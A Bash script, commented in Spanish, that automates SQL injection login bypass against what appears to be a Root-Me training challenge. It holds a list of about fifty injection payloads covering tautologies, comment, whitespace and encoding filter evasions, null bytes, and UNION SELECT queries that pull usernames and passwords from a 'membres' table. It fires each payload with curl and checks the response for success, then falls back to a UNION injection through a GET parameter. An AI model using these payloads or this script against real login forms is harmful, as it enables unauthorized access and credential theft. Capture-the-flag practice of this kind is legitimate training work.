#!/bin/bash

# ================================================
# SQL INJECTION - FILTER BYPASS
# PRUEBA DE TODOS LOS MÉTODOS DE BYPASS
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  BYPASS DE LOGIN - CH30${NC}"
echo -e "${BLUE}  Probando ${#payloads[@]} métodos${NC}"
echo -e "${BLUE}========================================${NC}"

# ============================================
# LISTA DE PAYLOADS PARA BYPASS
# ============================================

declare -a payloads=(
    # Básicos
    "username=admin&password=' OR 1=1#"
    "username=admin&password=' OR '1'='1"
    "username=admin&password=' OR 1=1--"
    "username=admin&password=' OR '1'='1'--"
    
    # Sin comillas
    "username=admin&password=1 OR 1=1#"
    "username=admin&password=1 OR '1'='1"
    
    # Con ||
    "username=admin&password=' || 1=1#"
    "username=admin&password=' || '1'='1"
    
    # Con AND
    "username=admin&password=' AND 1=1#"
    "username=admin&password=' AND '1'='1"
    
    # Con comentarios
    "username=admin&password='/**/OR/**/1=1#"
    "username=admin&password='%09OR%091=1#"
    "username=admin&password='%0aOR%0a1=1#"
    "username=admin&password='%0dOR%0d1=1#"
    "username=admin&password='OR(1=1)#"
    "username=admin&password=' OoR 1=1#"
    "username=admin&password=' oR 1=1#"
    "username=admin&password=' Or 1=1#"
    "username=admin&password=' O/**/R 1=1#"
    
    # Sin OR
    "username=admin&password='='#"
    "username=admin&password=' LIKE '%'#"
    "username=admin&password=' + 1=1#"
    "username=admin&password=' - 1=0#"
    "username=admin&password=' * 1=1#"
    "username=admin&password=' / 1=1#"
    
    # UNION SELECT en password
    "username=admin&password=' UNION SELECT 1,2,3,4#"
    "username=admin&password=' UNION SELECT 1,2,3,4--"
    "username=admin&password=' UNION/**/SELECT/**/1,2,3,4#"
    "username=admin&password=' UNION ALL SELECT 1,2,3,4#"
    "username=admin&password=' UNION SELECT 1,'admin','password',4#"
    "username=admin&password=' UNION SELECT 1,username,pass,4 FROM membres#"
    
    # Inyección en usuario
    "username=' OR 1=1#&password=test"
    "username=' OR '1'='1&password=test"
    "username=' || 1=1#&password=test"
    "username=admin' OR 1=1#&password=test"
    "username=admin'--&password=test"
    "username=admin'#&password=test"
    "username=' UNION SELECT 1,2,3,4#&password=test"
    "username=' UNION SELECT 1,'admin','password',4#&password=test"
    
    # Bypass con NULL
    "username=admin&password=' OR 1=1;%00"
    "username=admin&password=' OR 1=1%00"
    
    # Codificación
    "username=admin&password=%27%20OR%201=1#"
    "username=admin&password=%2527%20OR%201=1#"
    
    # Comillas dobles
    "username=admin&password=\" OR 1=1#"
    "username=admin&password=\" OR \"1\"=\"1"
)

# ============================================
# PRUEBA DE PAYLOADS
# ============================================

echo -e "\n${YELLOW}[+] Probando ${#payloads[@]} payloads...${NC}\n"

SUCCESS=0
COUNT=0

for payload in "${payloads[@]}"; do
    COUNT=$((COUNT + 1))
    
    # Mostrar progreso
    echo -ne "${BLUE}[$COUNT/${#payloads[@]}]${NC} Probando: ${payload:0:50}..."
    
    # Ejecutar
    response=$(curl -s -X POST "$URL" -d "$payload")
    
    # Verificar éxito
    if echo "$response" | grep -q "Membres" && ! echo "$response" | grep -q "login failed"; then
        echo -e " ${GREEN}✅ ÉXITO!${NC}"
        echo -e "\n${GREEN}========================================${NC}"
        echo -e "${GREEN}  ¡BY PASS ENCONTRADO!${NC}"
        echo -e "${GREEN}  Payload: $payload${NC}"
        echo -e "${GREEN}========================================${NC}"
        SUCCESS=1
        break
    else
        echo -e " ${RED}❌ Fallo${NC}"
    fi
done

# ============================================
# SI NINGUNO FUNCIONA
# ============================================

if [ $SUCCESS -eq 0 ]; then
    echo -e "\n${RED}========================================${NC}"
    echo -e "${RED}  NINGÚN PAYLOAD FUNCIONÓ${NC}"
    echo -e "${RED}========================================${NC}"
    echo -e "\n${YELLOW}[!] Probando con creación de usuario virtual...${NC}"
    
    # Probar con UNION SELECT en action=membres
    echo -e "\n${YELLOW}[+] Creando usuario virtual con admin/password123...${NC}"
    curl -s "$URL?action=membres&id=1' UNION SELECT 1,'admin','password123',4 FROM membres WHERE 1=2#" > /dev/null
    
    # Intentar autenticar
    echo -e "\n${YELLOW}[+] Intentando autenticar con admin/password123...${NC}"
    login_response=$(curl -s -X POST "$URL" -d "username=admin&password=password123")
    
    if echo "$login_response" | grep -q "Membres" && ! echo "$login_response" | grep -q "login failed"; then
        echo -e "${GREEN}========================================${NC}"
        echo -e "${GREEN}  ¡BY PASS VIRTUAL EXITOSO!${NC}"
        echo -e "${GREEN}  Usuario: admin${NC}"
        echo -e "${GREEN}  Contraseña: password123${NC}"
        echo -e "${GREEN}========================================${NC}"
    else
        echo -e "${RED}❌ Falló la autenticación virtual${NC}"
    fi
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN DE PRUEBAS${NC}"
echo -e "${BLUE}========================================${NC}"
